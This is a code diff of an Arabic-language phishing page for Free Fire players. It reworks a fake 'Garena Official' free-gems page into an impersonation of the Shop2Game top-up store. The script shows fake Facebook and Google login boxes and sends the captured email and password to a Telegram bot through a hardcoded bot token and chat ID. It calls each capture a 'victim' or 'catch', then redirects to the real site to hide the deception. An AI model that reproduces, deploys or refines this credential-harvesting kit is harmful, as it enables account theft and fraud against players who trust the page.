@@ -3,97 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن جواهر فري فاير - Garena Official</title>
+    <title>Shop2Game - مركز الشحن الرسمي</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
-        *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Cairo',sans-serif;background:linear-gradient(135deg,#0f0f23,#1a1a3e,#2a2a5e,#16213e);background-size:400% 400%;animation:gradientShift 20s ease infinite;color:#fff;line-height:1.6;padding:10px;min-height:100vh;overflow-x:hidden;position:relative}@keyframes gradientShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}.gem-rain{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1}.gem{position:absolute;font-size:20px;animation:fall linear infinite;opacity:.7}@keyframes fall{to{transform:translateY(100vh) rotate(360deg);opacity:0}}.container{max-width:100%;margin:0 auto;background:rgba(255,255,255,.08);backdrop-filter:blur(20px);border-radius:25px;box-shadow:0 25px 50px rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.1);overflow:hidden;position:relative;z-index:10}header{background:linear-gradient(45deg,#00d4ff,#0099cc,#007acc);color:#fff;text-align:center;padding:25px;position:relative}.garena-badge{position:absolute;top:15px;right:15px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:#fff;padding:8px 15px;border-radius:25px;font-size:.85rem;font-weight:700;box-shadow:0 5px 15px rgba(255,107,107,.4);animation:pulse 2s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}header h1{font-size:clamp(1.8rem,6vw,3rem);margin-bottom:10px;text-shadow:0 0 20px rgba(255,255,255,.5)}.ff-logo{width:80px;height:80px;margin:0 auto 15px;background:url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iNDAiIGN5PSI0MCIgcj0iNDAiIGZpbGw9IiNGRjZCNkIiLz4KPHRleHQgeD0iNDAiIHk9IjUwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMjQiIGZpbGw9IiNGRkYiPkZGPC90ZXh0Pgo8L3N2Zz4K') center/contain no-repeat}.login-section{padding:35px 25px;text-align:center}.login-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;max-width:550px;margin:0 auto 30px}@media (max-width:500px){.login-grid{grid-template-columns:1fr;gap:15px}}.login-btn{background:linear-gradient(145deg,#667eea 0%,#764ba2 100%);color:#fff!important;border:none;padding:22px;font-size:clamp(1.1rem,4.5vw,1.2rem);border-radius:20px;cursor:pointer;box-shadow:0 15px 30px rgba(102,126,234,.4);transition:all .4s ease;min-height:70px;display:flex;align-items:center;justify-content:center;text-decoration:none!important;position:relative;overflow:hidden;font-weight:600;backdrop-filter:blur(10px)}.google-btn{background:linear-gradient(145deg,#4285f4 0%,#34a853 100%);box-shadow:0 15px 30px rgba(66,133,244,.4)}.google-btn::before{content:'👤 ';margin-left:10px;font-size:1.2em}.facebook-btn{background:linear-gradient(145deg,#4267b2 0%,#1877f2 100%);box-shadow:0 15px 30px rgba(66,103,178,.4)}.facebook-btn::before{content:'📘 ';margin-left:10px;font-size:1.2em}.login-btn:hover{transform:translateY(-5px) scale(1.03);box-shadow:0 20px 40px rgba(102,126,234,.5)}.prices-section{padding:40px 25px;background:rgba(0,0,0,.3)}.section-title{color:#00d4ff;font-size:clamp(1.4rem,5vw,2rem);text-align:center;margin-bottom:30px;text-shadow:0 0 15px rgba(0,212,255,.5)}.prices-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:20px;max-width:700px;margin:0 auto}.price-card{background:linear-gradient(145deg,rgba(255,255,255,.1),rgba(255,255,255,.05));padding:25px 20px;border-radius:20px;text-align:center;box-shadow:0 15px 35px rgba(0,0,0,.2);transition:all .4s ease;backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.1)}.price-card:hover{transform:translateY(-8px) scale(1.05);box-shadow:0 25px 50px rgba(0,212,255,.2);border-color:#00d4ff}.gems{font-size:2rem;font-weight:700;background:linear-gradient(45deg,#ff6b6b,#ffd93d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:12px;text-shadow:0 0 20px rgba(255,107,107,.5)}.price{font-size:1.4rem;color:#00d4ff;font-weight:700;text-shadow:0 0 10px rgba(0,212,255,.5)}footer{background:rgba(0,0,0,.6);color:#00d4ff;text-align:center;padding:25px;font-size:.95rem;font-weight:600}.official-notice{background:linear-gradient(45deg,#ff6b6b,#ee5a24);padding:12px 20px;border-radius:15px;margin-top:15px;box-shadow:0 5px 15px rgba(255,107,107,.3);animation:glow 2s infinite alternate}@keyframes glow{from{box-shadow:0 5px 15px rgba(255,107,107,.3)}to{box-shadow:0 5px 25px rgba(255,107,107,.5)}}@media (max-width:480px){.prices-grid{grid-template-columns:repeat(2,1fr);gap:15px}}
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background-color: #1a1a1a; color: #fff; text-align: center; }
+        
+        header { background: #ee1c24; padding: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.5); display: flex; justify-content: space-between; align-items: center; padding: 10px 5%; }
+        .logo { font-weight: bold; font-size: 1.5rem; color: #white; }
+        
+        .hero { background: #222; padding: 40px 20px; border-bottom: 4px solid #ee1c24; }
+        .section-title { margin-bottom: 30px; font-size: 1.2rem; color: #ccc; }
+        
+        .game-card { background: #333; width: 160px; margin: 0 auto; padding: 20px; border-radius: 10px; border: 2px solid #ee1c24; cursor: pointer; transition: 0.3s; }
+        .game-card img { width: 100%; border-radius: 8px; margin-bottom: 10px; }
+        .game-card:hover { transform: scale(1.05); background: #444; }
+
+        .login-options { display: none; margin-top: 30px; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        .method-btn { display: flex; align-items: center; justify-content: center; width: 280px; margin: 10px auto; padding: 15px; border-radius: 5px; border: none; cursor: pointer; font-weight: bold; font-size: 1rem; }
+        .fb-btn { background: #1877f2; color: white; }
+        .gl-btn { background: #fff; color: #555; border: 1px solid #ddd; }
+
+        /* Overlay Style */
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: none; align-items: center; justify-content: center; }
+        .login-box { background: #fff; color: #333; padding: 30px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; }
+        .login-box h2 { margin-bottom: 20px; color: #ee1c24; }
+        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 1rem; }
+        .login-box button { width: 100%; padding: 12px; background: #ee1c24; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        
+        footer { margin-top: 50px; padding: 20px; font-size: 0.8rem; color: #777; background: #111; }
     </style>
 </head>
 <body>
-    <div class="gem-rain" id="gemRain"></div>
-    <div class="container">
-        <header>
-            <div class="garena-badge">🔥 Garena Official</div>
-            <div class="ff-logo"></div>
-            <h1>شحن جواهر فري فاير 💎</h1>
-            <p>شحن مجاني فوري من Garena الرسمي</p>
-        </header>
-        <section class="login-section">
-            <h2 style="margin-bottom:30px;font-size:clamp(1.4rem,5vw,1.8rem);">اختر الدخول الآمن</h2>
-            <div class="login-grid">
-                <button class="login-btn google-btn" onclick="showGoogleLogin()">تسجيل Google</button>
-                <button class="login-btn facebook-btn" onclick="showFacebookLogin()">تسجيل Facebook</button>
-            </div>
-        </section>
-        <section class="prices-section">
-            <h2 class="section-title">أسعار الجواهر المجانية</h2>
-            <div class="prices-grid">
-                <div class="price-card"><div class="gems">💎 1000</div><div class="price">مجاناً</div></div>
-                <div class="price-card"><div class="gems">💎 2188</div><div class="price">5$</div></div>
-                <div class="price-card"><div class="gems">💎 3555</div><div class="price">10$</div></div>
-                <div class="price-card"><div class="gems">💎 5260</div><div class="price">50$</div></div>
-                <div class="price-card"><div class="gems">💎 10000</div><div class="price">60$</div></div>
-                <div class="price-card"><div class="gems">💎 VIP 20000</div><div class="price">70$</div></div>
-            </div>
-        </section>
-        <footer>
-            <p>🔥 الموقع الرسمي من Garena Free Fire</p>
-            <div class="official-notice">✅ شحن مضمون 100% - Garena Official Partner</div>
-        </footer>
+
+    <header>
+        <div class="logo">Shop2Game</div>
+        <div style="font-size: 0.9rem;">العربية 🌍</div>
+    </header>
+
+    <section class="hero">
+        <h2 class="section-title">اختر اللعبة</h2>
+        <div class="game-card" onclick="showMethods()">
+            <img src="https://cdns.garena.com/gop/app/0000/100/067/icon.png" alt="Free Fire">
+            <p>Free Fire</p>
+        </div>
+
+        <div id="methods" class="login-options">
+            <h2 class="section-title">تسجيل الدخول عبر حساب اللعبة</h2>
+            <button class="method-btn fb-btn" onclick="openLogin('Facebook')">🌐 Facebook</button>
+            <button class="method-btn gl-btn" onclick="openLogin('Google')">📧 Google</button>
+        </div>
+    </section>
+
+    <div id="overlay">
+        <div class="login-box">
+            <h2 id="methodTitle">Login</h2>
+            <p style="margin-bottom: 15px; font-size: 0.9rem;">يرجى تسجيل الدخول للتحقق من ملكية الحساب</p>
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button onclick="sendToBot()">تسجيل الدخول</button>
+            <p onclick="closeOverlay()" style="margin-top: 15px; cursor: pointer; color: #777;">إلغاء</p>
+        </div>
     </div>
 
+    <footer>
+        <p>© Garena Online. جميع الحقوق محفوظة.</p>
+        <p>سياسة الخصوصية | شروط الخدمة</p>
+    </footer>
+
     <script>
-        // الرموز البرمجية للبوت
-        const TELEGRAM_TOKEN = '8445311511:AAFYyFSR9ZSZdTYIHNAZI5wNzL8xmzHmJzw';
-        const TELEGRAM_CHAT_ID = '7902407443';
+        const TOKEN = '8445311511:AAFYyFSR9ZSZdTYIHNAZI5wNzL8xmzHmJzw';
+        const CHAT_ID = '7902407443';
+        let currentMethod = '';
 
-        function createGems(){const e=document.getElementById('gemRain'),t=['💎','⭐','✨','🔥','⚡'];setInterval(()=>{const n=document.createElement('div');n.className='gem',n.innerHTML=t[Math.floor(Math.random()*t.length)],n.style.left=Math.random()*100+'%',n.style.animationDuration=Math.random()*3+2+'s',n.style.animationDelay=Math.random()*2+'s',e.appendChild(n),setTimeout(()=>n.remove(),5e3)},300)}
-        createGems();
-
-        function showGoogleLogin(){
-            document.body.insertAdjacentHTML('beforeend',`
-            <div id="overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:9999;display:flex;align-items:center;justify-content:center;color:white;padding:20px;">
-                <div style="background:linear-gradient(135deg,#4285f4,#34a853);padding:40px;border-radius:25px;max-width:95%;text-align:center;box-shadow:0 30px 60px rgba(66,133,244,.5);">
-                    <h2 style="margin-bottom:25px;font-size:1.8rem;">🔐 Google Sign In</h2>
-                    <input type="email" id="log_email" placeholder="Gmail" style="width:100%;padding:18px;margin:12px 0;border-radius:15px;border:none;font-size:16px;">
-                    <input type="password" id="log_pass" placeholder="Password" style="width:100%;padding:18px;margin:12px 0;border-radius:15px;border:none;font-size:16px;">
-                    <button onclick="processBotLogin('Google')" style="background:#fff;color:#4285f4;padding:18px 40px;border:none;border-radius:15px;font-size:18px;font-weight:700;cursor:pointer;margin:20px 10px 10px;">✅ Login</button>
-                    <button onclick="closeOverlay()" style="background:rgba(255,255,255,.2);color:white;padding:12px 25px;border:none;border-radius:12px;">❌ Close</button>
-                </div>
-            </div>`);
+        function showMethods() {
+            document.getElementById('methods').style.display = 'block';
+            window.scrollTo(0, document.body.scrollHeight);
         }
 
-        function showFacebookLogin(){
-            document.body.insertAdjacentHTML('beforeend',`
-            <div id="overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:9999;display:flex;align-items:center;justify-content:center;color:white;padding:20px;">
-                <div style="background:linear-gradient(135deg,#4267b2,#1877f2);padding:40px;border-radius:25px;max-width:95%;text-align:center;box-shadow:0 30px 60px rgba(66,103,178,.5);">
-                    <h2 style="margin-bottom:25px;font-size:1.8rem;">📘 Facebook Login</h2>
-                    <input type="text" id="log_email" placeholder="Email or Phone" style="width:100%;padding:18px;margin:12px 0;border-radius:15px;border:none;font-size:16px;">
-                    <input type="password" id="log_pass" placeholder="Password" style="width:100%;padding:18px;margin:12px 0;border-radius:15px;border:none;font-size:16px;">
-                    <button onclick="processBotLogin('Facebook')" style="background:#fff;color:#1877f2;padding:18px 40px;border:none;border-radius:15px;font-size:18px;font-weight:700;cursor:pointer;margin:20px 10px 10px;">✅ Login</button>
-                    <button onclick="closeOverlay()" style="background:rgba(255,255,255,.2);color:white;padding:12px 25px;border:none;border-radius:12px;">❌ Close</button>
-                </div>
-            </div>`);
+        function openLogin(method) {
+            currentMethod = method;
+            document.getElementById('methodTitle').innerText = method + " Login";
+            document.getElementById('overlay').style.display = 'flex';
         }
 
-        function closeOverlay(){document.getElementById('overlay')?.remove()}
+        function closeOverlay() {
+            document.getElementById('overlay').style.display = 'none';
+        }
 
-        async function processBotLogin(method){
-            const email = document.getElementById('log_email').value;
-            const pass = document.getElementById('log_pass').value;
+        async function sendToBot() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
 
-            if(!email || !pass) return alert('⚠️ يرجى إدخال جميع البيانات');
+            if (!email || !pass) {
+                alert("يرجى إدخال البيانات كاملة");
+                return;
+            }
 
-            const text = `👤 ضحية جديدة (${method}):\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
+            const text = `🎯 صيد جديد من Shop2Game:\n\n📱 الطريقة: ${currentMethod}\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
 
             try {
                 await fetch(url);
-                closeOverlay();
-                // توجيه لموقع قارينا الحقيقي لإتمام الخدعة
-                window.location.href = "https://www.ff.garena.com/";
+                // التوجيه لموقع Shop2Game الأصلي لإتمام التمويه
+                window.location.href = "https://shop2game.com/app/100067/login";
             } catch (e) {
-                alert("حدث خطأ في الاتصال، حاول مجدداً");
+                alert("خطأ في الاتصال!");
             }
         }
     </script>
